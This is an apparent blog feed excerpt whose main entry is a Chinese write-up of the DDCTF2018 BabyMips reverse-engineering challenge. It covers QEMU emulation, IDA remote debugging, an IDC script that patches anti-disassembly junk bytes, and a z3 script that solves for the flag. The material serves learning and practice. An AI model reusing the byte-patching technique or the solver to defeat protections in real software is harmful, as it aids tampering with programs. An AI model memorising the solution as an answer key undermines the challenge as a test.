    <content type="html"><![CDATA[<h1 id="0x00-Mips指令架构"><a class="header-anchor" href="#0x00-Mips指令架构">¶</a>0x00-Mips指令架构</h1><blockquote><p>MIPS架构（英语：MIPS architecture，为Microprocessor without interlocked piped stages architecture的缩写，亦为Millions of Instructions Per Second的双关语），是一种采取精简指令集（RISC）的处理器架构，1981年出现，由MIPS科技公司开发并授权，广泛被使用在许多电子产品、网络设备、个人娱乐装置与商业装置上。最早的MIPS架构是32位，最新的版本已经变成64位。</p></blockquote><blockquote><p><strong>使用linux下的readelf命令可以了解到文件相关信息</strong></p></blockquote><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650604608575.png" alt=""></p><h1 id="0x01-环境安装"><a class="header-anchor" href="#0x01-环境安装">¶</a>0x01-环境安装</h1><p>由于程序是MIPS指令架构的，而通常我们使用的电脑是x86架构的，无法直接运行该程序，这时可以借助Qemu模拟器来运行程序。QEMU是运行在用户层的开源全虚拟化解决方案，可以在Intel机器上虚拟出完整的操作系统。QEMU主要有两种运作方式</p><ul><li>User Mode:即使用者模式，能单独运行那些为不同处理编译的Linux程序</li><li>System Mode:即系统模式，能够模拟整个操作系统，包括中央处理器及其他周边设备</li></ul><p>由于BabyMips程序是通过静态链接生成的，为了方便，在User Mode下使用QEMU来运行该程序</p><p>使用下面的命令来安装QEMU</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu<span class="operator">-</span><span class="keyword">user</span><span class="operator">-</span><span class="keyword">static</span></span><br><span class="line">sudo apt install qemu<span class="operator">-</span><span class="keyword">user</span></span><br></pre></td></tr></tbody></table></figure><p>安装qemu对应下的mips64库</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> apt install libc<span class="number">6</span>-mips<span class="number">64</span>-cross</span><br></pre></td></tr></tbody></table></figure><h1 id="0x01-DDCTF2018-BabyMips"><a class="header-anchor" href="#0x01-DDCTF2018-BabyMips">¶</a>0x01-DDCTF2018-BabyMips</h1><h2 id="静态分析"><a class="header-anchor" href="#静态分析">¶</a>静态分析</h2><p>readelf读取文件信息-Mips32-小端序</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606053687.png" alt=""></p><p>运行试试</p><p>出现错误</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606188738.png" alt=""></p><blockquote><p><strong>先使用Ghidra查看反编译代码，也可以使用ida7.5即以上版本反编译，也可以使用jeb-mips</strong></p></blockquote><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606391321.png" alt="ghidra"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606413794.png" alt="ida7.7"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606537986.png" alt="jeb"></p><p>可以看到先让我们输入，然后进入函数进行判断，所以我们需要知道函数进行了什么加密操作</p><p>进入函数后发现分析出错了，在最后跳转时跳转到了垃圾数据的位置，所以我们试一下动态调试</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606639388.png" alt=""></p><h2 id="动态调试"><a class="header-anchor" href="#动态调试">¶</a>动态调试</h2><p>ida+QEMU调试</p><p>首先在ida中选择Remote GDB Debugger</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606835259.png" alt=""></p><p>然后Debugger设置好</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607126949.png" alt=""></p><p>连接</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">qemu</span>-mipsel -g <span class="number">23946</span> Baby_Mips</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>-g后面跟着端口号+文件名</strong></p></blockquote><p>端口的另一边可以选择IDA也可以选择GDB，这里我选择DIA</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607359256.png" alt=""></p><p>在IDA中启动调试</p><p>成功断下</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607396583.png" alt=""></p><p>接下来定位到刚才出错的地址，下个断点</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607460822.png" alt=""></p><p>放开程序</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607488259.png" alt="等待我们输入"></p><p>输入完成后，提示出错</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607545161.png" alt="报错"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650608745243.png" alt=""></p><p>F8也会出现异常</p><p>查找<code>lwc1</code>指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到<code>$f29</code>和<code>$t1</code>寄存器的内容</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650609292804.png" alt="大佬的思路"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650609507747.png" alt=""></p><p>也就是说E8本来是8位，也就是两个字节，但是mips指令为4字节，所以跳转的时候出错了</p><p>使用idc进行Patch</p><p>注意idc不支持+=操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">auto</span> addr=<span class="number">0x4001F0</span>;</span><br><span class="line">    <span class="keyword">auto</span> addr1=<span class="number">0x403234</span>;</span><br><span class="line">    <span class="keyword">for</span>(;addr&lt;=addr1;addr=<span class="number">4</span>+addr)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(Byte(addr)==<span class="number">0xeb</span> &amp;&amp; Byte(addr+<span class="number">1</span>)==<span class="number">0x02</span>)</span><br><span class="line">        {</span><br><span class="line">            PatchByte(addr,<span class="number">0x00</span>);</span><br><span class="line">            PatchByte(addr+<span class="number">1</span>,<span class="number">0x00</span>);</span><br><span class="line">            PatchByte(addr+<span class="number">2</span>,<span class="number">0x00</span>);</span><br><span class="line">            PatchByte(addr+<span class="number">3</span>,<span class="number">0x00</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//printf("finished");</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>保存之后重新拖进jeb反编译</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650611442753.png" alt=""></p><h2 id="脚本-v6"><a class="header-anchor" href="#脚本-v6">¶</a>脚本</h2><p>十六个方程组，使用z3求解</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [BitVec(<span class="string">'a%d'</span> %i, <span class="number">32</span>) <span class="keyword">for</span> i in range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">0xffffc20e</span>*a[<span class="number">0</span>]<span class="number">-0xbd52</span>*a[<span class="number">1</span>]+<span class="number">0x7f57</span>*a[<span class="number">2</span>]+<span class="number">0x96cd</span>*a[<span class="number">3</span>]<span class="number">-0xac7f</span>*a[<span class="number">4</span>] +<span class="number">0x5d80</span>*a[<span class="number">5</span>]+<span class="number">0xb25e</span>*a[<span class="number">6</span>]+<span class="number">0x2447</span>*a[<span class="number">7</span>]+<span class="number">0xba8a</span>*a[<span class="number">8</span>]+<span class="number">0xbb41</span>*a[<span class="number">9</span>]+<span class="number">0xa3a8</span>*a[<span class="number">10</span>]+<span class="number">0xcb12</span>*a[<span class="number">11</span>]<span class="number">-0x6958</span>*a[<span class="number">12</span>]+<span class="number">0x5821</span>*a[<span class="number">13</span>]+<span class="number">0x77ed</span>*a[<span class="number">14</span>]+<span class="number">0xf7ff</span>*a[<span class="number">15</span>] == <span class="number">0x162f0ca</span> )</span><br><span class="line">s.add(<span class="number">0xeb44</span>*a[<span class="number">0</span>]<span class="number">-0x0f99</span>*a[<span class="number">1</span>] - <span class="number">0x40e7</span>*a[<span class="number">2</span>] +<span class="number">0xdf2e</span>*a[<span class="number">3</span>] <span class="number">-0x4b2e</span>*a[<span class="number">4</span>] <span class="number">-0x96b5</span>*a[<span class="number">5</span>] +<span class="number">0x9d66</span>*a[<span class="number">6</span>] <span class="number">-0xafa8</span>*a[<span class="number">7</span>] <span class="number">-0x6e26</span>*a[<span class="number">8</span>] <span class="number">-0xe655</span>*a[<span class="number">9</span>]- <span class="number">0x9a6e</span>*a[<span class="number">10</span>] +<span class="number">0x57ba</span>*a[<span class="number">11</span>] <span class="number">-0x227c</span>*a[<span class="number">12</span>] +<span class="number">0xbdd1</span>*a[<span class="number">13</span>] +<span class="number">0xb437</span>*a[<span class="number">14</span>] +<span class="number">0x5d3f</span>*a[<span class="number">15</span>]== <span class="number">0xffec2e48</span>)</span><br><span class="line">s.add(<span class="number">0xe6f1</span>*a[<span class="number">0</span>] +<span class="number">0xa4b2</span>*a[<span class="number">1</span>] <span class="number">-0xfe74</span>*a[<span class="number">2</span>] <span class="number">-0x0f07</span>*a[<span class="number">3</span>] <span class="number">-0x5d22</span>*a[<span class="number">4</span>] <span class="number">-0xb845</span>*a[<span class="number">5</span>] <span class="number">-0x9954</span>*a[<span class="number">6</span>] +<span class="number">0x93ac</span>*a[<span class="number">7</span>] <span class="number">-0x51e4</span>*a[<span class="number">8</span>] <span class="number">-0x4b11</span>*a[<span class="number">9</span>] +<span class="number">0xdc93</span>*a[<span class="number">10</span>] +<span class="number">0x13f8</span>*a[<span class="number">11</span>] +<span class="number">0x246c</span>*a[<span class="number">12</span>] +<span class="number">0xf121</span>*a[<span class="number">13</span>] +<span class="number">0xf09f</span>*a[<span class="number">14</span>] +<span class="number">0x0dfa</span>*a[<span class="number">15</span>] == <span class="number">0xd3c060</span>)</span><br><span class="line">s.add(<span class="number">0xffff7085</span>*a[<span class="number">0</span>] <span class="number">-0x6623</span>*a[<span class="number">1</span>] +<span class="number">0x0686</span>*a[<span class="number">2</span>] +<span class="number">0x4b2d</span>*a[<span class="number">3</span>] +<span class="number">0x68df</span>*a[<span class="number">4</span>] +<span class="number">0x9be7</span>*a[<span class="number">5</span>] +<span class="number">0x21b4</span>*a[<span class="number">6</span>] +<span class="number">0xe25a</span>*a[<span class="number">7</span>] <span class="number">-0xc807</span>*a[<span class="number">8</span>] +<span class="number">0xf695</span>*a[<span class="number">9</span>] <span class="number">-0x5421</span>*a[<span class="number">10</span>] <span class="number">-0x2469</span>*a[<span class="number">11</span>] +<span class="number">0x9f29</span>*a[<span class="number">12</span>] <span class="number">-0xe311</span>*a[<span class="number">13</span>] +<span class="number">0x78f2</span>*a[<span class="number">14</span>] <span class="number">-0x6bda</span>*a[<span class="number">15</span>] == <span class="number">0x8bf576</span>)</span><br><span class="line">s.add(<span class="number">0xffff07b8</span>*a[<span class="number">0</span>] <span class="number">-0xd048</span>*a[<span class="number">1</span>] <span class="number">-0x85f1</span>*a[<span class="number">2</span>] +<span class="number">0xee84</span>*a[<span class="number">3</span>] <span class="number">-0x37d1</span>*a[<span class="number">4</span>] +<span class="number">0xb74a</span>*a[<span class="number">5</span>] +<span class="number">0xcfe2</span>*a[<span class="number">6</span>]+ <span class="number">0x8f1e</span>*a[<span class="number">7</span>] <span class="number">-0xf211</span>*a[<span class="number">8</span>] <span class="number">-0x83bf</span>*a[<span class="number">9</span>] <span class="number">-0x1249</span>*a[<span class="number">10</span>] +<span class="number">0x7ea7</span>*a[<span class="number">11</span>] <span class="number">-0x4294</span>*a[<span class="number">12</span>] <span class="number">-0xb661</span>*a[<span class="number">13</span>] <span class="number">-0x8a73</span>*a[<span class="number">14</span>] <span class="number">-0x5e5c</span>*a[<span class="number">15</span>] == <span class="number">0xff4ea5b3</span>)</span><br><span class="line">s.add(<span class="number">0xffffd6b5</span>*a[<span class="number">0</span>] <span class="number">-0x2b5f</span>*a[<span class="number">1</span>]+ <span class="number">0xc981</span>*a[<span class="number">2</span>] <span class="number">-0x60c3</span>*a[<span class="number">3</span>] +<span class="number">0xf8f2</span>*a[<span class="number">4</span>]+ <span class="number">0xded7</span>*a[<span class="number">5</span>]- <span class="number">0xf6fb</span>*a[<span class="number">6</span>] +<span class="number">0x1083</span>*a[<span class="number">7</span>]- <span class="number">0xdc96</span>*a[<span class="number">8</span>]- <span class="number">0x587e</span>*a[<span class="number">9</span>] <span class="number">-0xb4f5</span>*a[<span class="number">10</span>] +<span class="number">0xf57a</span>*a[<span class="number">11</span>] +<span class="number">0x57d0</span>*a[<span class="number">12</span>] +<span class="number">0xe814</span>*a[<span class="number">13</span>] +<span class="number">0x6169</span>*a[<span class="number">14</span>] +<span class="number">0xf285</span>*a[<span class="number">15</span>] == <span class="number">0x9dd61e</span>)</span><br><span class="line">s.add(<span class="number">0xcd89</span>*a[<span class="number">0</span>] <span class="number">-0xd43d</span>*a[<span class="number">1</span>] +<span class="number">0xf037</span>*a[<span class="number">2</span>] +<span class="number">0x83a8</span>*a[<span class="number">3</span>] <span class="number">-0xa305</span>*a[<span class="number">4</span>] <span class="number">-0xadef</span>*a[<span class="number">5</span>] +<span class="number">0xcaaa</span>*a[<span class="number">6</span>] <span class="number">-0xf145</span>*a[<span class="number">7</span>]- <span class="number">0x6073</span>*a[<span class="number">8</span>]- <span class="number">0x2777</span>*a[<span class="number">9</span>] +<span class="number">0x794f</span>*a[<span class="number">10</span>] +<span class="number">0xf00e</span>*a[<span class="number">11</span>] <span class="number">-0xe7d5</span>*a[<span class="number">12</span>] +<span class="number">0x2654</span>*a[<span class="number">13</span>] <span class="number">-0xbed0</span>*a[<span class="number">14</span>] <span class="number">-0xb8af</span>*a[<span class="number">15</span>] == <span class="number">0xff6baab3</span>)</span><br><span class="line">s.add(<span class="number">0xffff6108</span>*a[<span class="number">0</span>] <span class="number">-0x6766</span>*a[<span class="number">1</span>] +<span class="number">0xd58e</span>*a[<span class="number">2</span>] <span class="number">-0x5ca3</span>*a[<span class="number">3</span>] +<span class="number">0x2718</span>*a[<span class="number">4</span>] +<span class="number">0x1e2b</span>*a[<span class="number">5</span>] <span class="number">-0xf49e</span>*a[<span class="number">6</span>] +<span class="number">0xcf78</span>*a[<span class="number">7</span>] +<span class="number">0x7c09</span>*a[<span class="number">8</span>] <span class="number">-0x13b7</span>*a[<span class="number">9</span>] <span class="number">-0xbeee</span>*a[<span class="number">10</span>]- <span class="number">0xe450</span>*a[<span class="number">11</span>] +<span class="number">0x4da3</span>*a[<span class="number">12</span>] <span class="number">-0x8880</span>*a[<span class="number">13</span>] <span class="number">-0x5691</span>*a[<span class="number">14</span>] +<span class="number">0x8bd8</span>*a[<span class="number">15</span>] == <span class="number">0xff818f06</span>)</span><br><span class="line">s.add(<span class="number">0xffffa564</span>*a[<span class="number">0</span>] <span class="number">-0xa95a</span>*a[<span class="number">1</span>] <span class="number">-0xe643</span>*a[<span class="number">2</span>] +<span class="number">0x0d38</span>*a[<span class="number">3</span>] <span class="number">-0x097a</span>*a[<span class="number">4</span>] <span class="number">-0xeb22</span>*a[<span class="number">5</span>] +<span class="number">0xcac3</span>*a[<span class="number">6</span>] <span class="number">-0x4ed1</span>*a[<span class="number">7</span>] <span class="number">-0x7c8a</span>*a[<span class="number">8</span>] +<span class="number">0xf107</span>*a[<span class="number">9</span>] +<span class="number">0xa59e</span>*a[<span class="number">10</span>]- <span class="number">0x1213</span>*a[<span class="number">11</span>] +<span class="number">0xb2b5</span>*a[<span class="number">12</span>] <span class="number">-0x7213</span>*a[<span class="number">13</span>] <span class="number">-0x2b83</span>*a[<span class="number">14</span>] <span class="number">-0xa155</span>*a[<span class="number">15</span>] == <span class="number">0xff8d50e7</span>)</span><br><span class="line">s.add(<span class="number">0xffff6c45</span>*a[<span class="number">0</span>] <span class="number">-0x2752</span>*a[<span class="number">1</span>] <span class="number">-0xbdc3</span>*a[<span class="number">2</span>] <span class="number">-0xf495</span>*a[<span class="number">3</span>] <span class="number">-0x7121</span>*a[<span class="number">4</span>] +<span class="number">0x9c41</span>*a[<span class="number">5</span>] <span class="number">-0x9465</span>*a[<span class="number">6</span>]- <span class="number">0x6ce3</span>*a[<span class="number">7</span>] <span class="number">-0x4f28</span>*a[<span class="number">8</span>] <span class="number">-0x8350</span>*a[<span class="number">9</span>] <span class="number">-0x176e</span>*a[<span class="number">10</span>] +<span class="number">0x7814</span>*a[<span class="number">11</span>] <span class="number">-0x739a</span>*a[<span class="number">12</span>] +<span class="number">0x5494</span>*a[<span class="number">13</span>] +<span class="number">0x142d</span>*a[<span class="number">14</span>] +<span class="number">0xca55</span>*a[<span class="number">15</span>] == <span class="number">0xff3f9826</span>)</span><br><span class="line">s.add(<span class="number">0xcf01</span>*a[<span class="number">0</span>] +<span class="number">0xf378</span>*a[<span class="number">1</span>] +<span class="number">0x1064</span>*a[<span class="number">2</span>] <span class="number">-0xd9a7</span>*a[<span class="number">3</span>] <span class="number">-0x077d</span>*a[<span class="number">4</span>]+ <span class="number">0x6dab</span>*a[<span class="number">5</span>] <span class="number">-0xaf1f</span>*a[<span class="number">6</span>]- <span class="number">0x3db7</span>*a[<span class="number">7</span>] +<span class="number">0x3554</span>*a[<span class="number">8</span>] <span class="number">-0xcb8e</span>*a[<span class="number">9</span>] <span class="number">-0x9815</span>*a[<span class="number">10</span>]+ <span class="number">0xf30b</span>*a[<span class="number">11</span>] +<span class="number">0x9c5e</span>*a[<span class="number">12</span>] <span class="number">-0x5d07</span>*a[<span class="number">13</span>] <span class="number">-0x4c31</span>*a[<span class="number">14</span>] +<span class="number">0xeae0</span>*a[<span class="number">15</span>] == <span class="number">0x213fed</span>)</span><br><span class="line">s.add(<span class="number">0x8bd4</span>*a[<span class="number">0</span>] <span class="number">-0x6d81</span>*a[<span class="number">1</span>] <span class="number">-0xe772</span>*a[<span class="number">2</span>] +<span class="number">0xb6f1</span>*a[<span class="number">3</span>] +<span class="number">0x9b57</span>*a[<span class="number">4</span>] <span class="number">-0x597d</span>*a[<span class="number">5</span>] +<span class="number">0x15d1</span>*a[<span class="number">6</span>]- <span class="number">0xa55e</span>*a[<span class="number">7</span>]+ <span class="number">0xfd13</span>*a[<span class="number">8</span>]+ <span class="number">0x17b4</span>*a[<span class="number">9</span>] +<span class="number">0xec78</span>*a[<span class="number">10</span>] <span class="number">-0xd51a</span>*a[<span class="number">11</span>] +<span class="number">0x56ad</span>*a[<span class="number">12</span>] <span class="number">-0xc319</span>*a[<span class="number">13</span>] +<span class="number">0x9f8e</span>*a[<span class="number">14</span>] +<span class="number">0xfa17</span>*a[<span class="number">15</span>] == <span class="number">0xa9f0dc</span>)</span><br><span class="line">s.add(<span class="number">0xffffb798</span>*a[<span class="number">0</span>] <span class="number">-0x8bef</span>*a[<span class="number">1</span>] +<span class="number">0x109d</span>*a[<span class="number">2</span>]- <span class="number">0xf9d4</span>*a[<span class="number">3</span>] +<span class="number">0x4ecf</span>*a[<span class="number">4</span>] +<span class="number">0xa896</span>*a[<span class="number">5</span>] +<span class="number">0x773b</span>*a[<span class="number">6</span>] +<span class="number">0x6e8a</span>*a[<span class="number">7</span>] <span class="number">-0x737c</span>*a[<span class="number">8</span>]+ <span class="number">0x4979</span>*a[<span class="number">9</span>] +<span class="number">0xc685</span>*a[<span class="number">10</span>] <span class="number">-0x96ae</span>*a[<span class="number">11</span>] +<span class="number">0x0bbd</span>*a[<span class="number">12</span>] +<span class="number">0x8280</span>*a[<span class="number">13</span>] +<span class="number">0xe3a9</span>*a[<span class="number">14</span>] <span class="number">-0x730c</span>*a[<span class="number">15</span>] == <span class="number">0xbdeb20</span>)</span><br><span class="line">s.add(<span class="number">0x0b20</span>*a[<span class="number">0</span>] +<span class="number">0x9b9c</span>*a[<span class="number">1</span>] +<span class="number">0xb4aa</span>*a[<span class="number">2</span>]+ <span class="number">0x6176</span>*a[<span class="number">3</span>] +<span class="number">0x9670</span>*a[<span class="number">4</span>] +<span class="number">0x7c9d</span>*a[<span class="number">5</span>] <span class="number">-0x5402</span>*a[<span class="number">6</span>] <span class="number">-0x8cd2</span>*a[<span class="number">7</span>] +<span class="number">0xac82</span>*a[<span class="number">8</span>] +<span class="number">0xa2f5</span>*a[<span class="number">9</span>] <span class="number">-0x8efd</span>*a[<span class="number">10</span>] <span class="number">-0x65f1</span>*a[<span class="number">11</span>] <span class="number">-0x94b9</span>*a[<span class="number">12</span>] +<span class="number">0x8cb8</span>*a[<span class="number">13</span>] +<span class="number">0x1cb5</span>*a[<span class="number">14</span>] +<span class="number">0x4aa1</span>*a[<span class="number">15</span>] == <span class="number">0x9c7cf5</span>)</span><br><span class="line">s.add(<span class="number">0x57fd</span>*a[<span class="number">0</span>] +<span class="number">0x3d83</span>*a[<span class="number">1</span>] +<span class="number">0xf745</span>*a[<span class="number">2</span>] +<span class="number">0xa5c4</span>*a[<span class="number">3</span>] <span class="number">-0x65fa</span>*a[<span class="number">4</span>] <span class="number">-0x58e9</span>*a[<span class="number">5</span>] +<span class="number">0xbebe</span>*a[<span class="number">6</span>] +<span class="number">0x1820</span>*a[<span class="number">7</span>] <span class="number">-0xd7b9</span>*a[<span class="number">8</span>] <span class="number">-0xb21f</span>*a[<span class="number">9</span>] <span class="number">-0x76a0</span>*a[<span class="number">10</span>] +<span class="number">0xc60d</span>*a[<span class="number">11</span>] +<span class="number">0x168f</span>*a[<span class="number">12</span>] +<span class="number">0x2a96</span>*a[<span class="number">13</span>] +<span class="number">0x31d6</span>*a[<span class="number">14</span>] <span class="number">-0x4b88</span>*a[<span class="number">15</span>] == <span class="number">0xd08e2</span>)</span><br><span class="line">s.add(<span class="number">0xffff1bae</span>*a[<span class="number">0</span>] <span class="number">-0xc7d4</span>*a[<span class="number">1</span>] <span class="number">-0x1554</span>*a[<span class="number">2</span>] +<span class="number">0x7eea</span>*a[<span class="number">3</span>] <span class="number">-0x684d</span>*a[<span class="number">4</span>] +<span class="number">0x6adb</span>*a[<span class="number">5</span>] +<span class="number">0x8534</span>*a[<span class="number">6</span>] <span class="number">-0x3a36</span>*a[<span class="number">7</span>] +<span class="number">0x29f0</span>*a[<span class="number">8</span>] +<span class="number">0xd3f2</span>*a[<span class="number">9</span>] <span class="number">-0x23e5</span>*a[<span class="number">10</span>] <span class="number">-0x6540</span>*a[<span class="number">11</span>] +<span class="number">0xbcd3</span>*a[<span class="number">12</span>] <span class="number">-0xef9b</span>*a[<span class="number">13</span>] +<span class="number">0xefdb</span>*a[<span class="number">14</span>] <span class="number">-0x774e</span>*a[<span class="number">15</span>] == <span class="number">0x178803</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item in a:</span><br><span class="line">    s.add(item &gt; <span class="number">0</span>, item &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">16</span>):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    print(<span class="string">''.join(map(chr, flag)))</span></span><br></pre></td></tr></tbody></table></figure><p>注意负数要换成十六进制</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650613838317.png" alt=""></p><h1 id="参考"><a class="header-anchor" href="#参考">¶</a>参考</h1><p><a href="https://blog.csdn.net/m0_46362499/article/details/107629918">https://blog.csdn.net/m0_46362499/article/details/107629918</a></p><p><a href="https://cloud.tencent.com/developer/article/1123681">https://cloud.tencent.com/developer/article/1123681</a></p><p><a href="https://cq674350529.github.io/2018/05/07/Solve-baby-mips-with-angr/">https://cq674350529.github.io/2018/05/07/Solve-baby-mips-with-angr/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Mips指令架构&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#0x00-Mips指令架构&quot;&gt;¶&lt;/a&gt;0x00-Mips指令架构&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;MIPS架构（英语：MIPS architecture，为M</summary>
      
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>pwnthebox刷题记录</title>
    <link href="https://gift1a.github.io/2022/04/22/pwnthebox%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://gift1a.github.io/2022/04/22/pwnthebox%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-04-22T01:50:53.000Z</published>
    <updated>2022-04-22T01:50:53.853Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>CRC算法</title>
    <link href="https://gift1a.github.io/2022/04/21/CRC%E7%AE%97%E6%B3%95/"/>
    <id>https://gift1a.github.io/2022/04/21/CRC%E7%AE%97%E6%B3%95/</id>
    <published>2022-04-21T08:32:35.000Z</published>
    <updated>2022-04-24T01:38:09.289Z</updated>
    
    <content type="html"><![CDATA[<p>CrackMe算法</p><span id="more"></span> <h1 id="0x00-前言"><a class="header-anchor" href="#0x00-前言">¶</a>0x00-前言</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;CrackMe算法&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题记录</title>
    <link href="https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-04-18T06:51:41.000Z</published>
    <updated>2022-04-20T05:25:59.456Z</updated>
    
